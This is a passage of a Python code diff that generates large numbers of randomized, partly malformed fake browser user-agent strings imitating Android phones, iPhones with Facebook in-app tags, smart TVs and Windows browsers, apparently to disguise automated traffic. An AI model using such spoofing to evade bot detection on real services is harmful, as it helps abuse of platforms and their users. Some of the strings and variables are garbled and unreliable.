+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Gecko/20100101 Firefox/108.0'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    
+    #Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.113 Safari/537.36
+    
+    aa='Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Linux; Android 6.0.1; SM-G532G Build/MMB29T'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/63.0.3239.83 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    #Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.113 Safari/537.36
+    
+    aa='Mozilla/5.0 (Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G991B;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Linux; Android 12; SAMSUNG SM-G991B'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+    #Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.113 Safari/537.36
+    aa='Mozilla/5.0 (SMART-TV; Linux; Tizen 2.4.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['SMART-TV; Linux; Tizen 2.4.0'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='SamsungBrowser/1.1 tv Safari/538.1'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    
+   
+   #Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
+   
+    aa='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+   
+   #Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
+   
+    aa='Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+   #Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF
+   
+    aa='Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Linux; Android 5.0; SAMSUNG SM-N900P Build/LRX21V'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/E7FBAF'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+   
+   #Mozilla/5.0 (Windows NT 11.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5395.113 Safari/537.36
+    aa='Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A515F;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Linux; Android 11; SAMSUNG SM-A515F'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+   
+   #Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF
+    aa='Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/E7FBAF'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+   
+   #NEW#AGENT
+    aa='Mozilla/5.0 (Linux; Android 10;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='RMX2185 Build/'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l=' 4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 '
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (SMART-TV;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='Linux; Tizen 2.4.0)'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebkit/538.1 (KHTML, like Gecko) SamsungBrowser/1.1 tv'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Safari/538.1'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; U; Android 10; '
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='Aquaris X2 Build/'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g=' QKQ1.200216.002) AppleWebKit/537.36 (KHTML, like Gecko) Versi/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9 .3'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 9;'
+    b=random.choice(['6','7','8','9','10','11','12'])
+    c='Lenovo TB-X605L Build/'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='PKQ1.190319.001 ) AppleWebKit/537.36 (KHTML, seperti Gecko) JioBrowser/1.4.7 Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='74.0.3729.136 Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+    #
+	
+    aa='Mozilla/5.0 (Linux; U; Android 5.1.1; zh-cn;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['vivo Xplay5A Build/LMY47V)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/534.30 (KHTML, seperti Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Versi/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['SAMSUNG SM-F900U Build/PPR1.180610.011'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Windows NT 10.0;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Win64; x64'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['SAMSUNG GT-I9506/XXUDOE4 Build/LRX22C'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.4 Chrome/56.0.2924.87'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Redmi Note 9 Pro)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/105.0.5195.19 Mobile Safari/537.36 TwitterAndroid'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['en-US; vivo 1807 Build/OPM1.171019.026'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 12;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['V2149 Build/'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Version/4.0 Chrome/103.0.5060.53 Mobile Safari/537.36uc mini browser3.0'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    a='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Infinix X6811 Build/RP1A.200720.011; wv'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Version/4.0 Chrome/107.0.5304.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 12;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['2201116PG'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 10;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['RMX2185 Build/QP1A.190711.020; wv)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 12;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['SHARK KTUS-H0'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 9;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['6002 Build/PPR1.180610.011; wv'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (iPhone;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['CPU iPhone OS 16_0 like Mac OS X)'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/605.1.15 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile/20A357 [FBAN/FBIOS;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/en_Qaau_GB;FBOP/5]'
+    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+    ugen.append(uaku2)
+	
+    aa='Mozilla/5.0 (Linux; Android 11;'
+    b=random.choice(['7.0','8.1.0','9','10','11','12'])
+    c=random.choice(['Infinix X688B'])
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko)'
+    h=random.randrange(80,103)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Chrome/107.0.0.0 Mobile Safari/537.36'
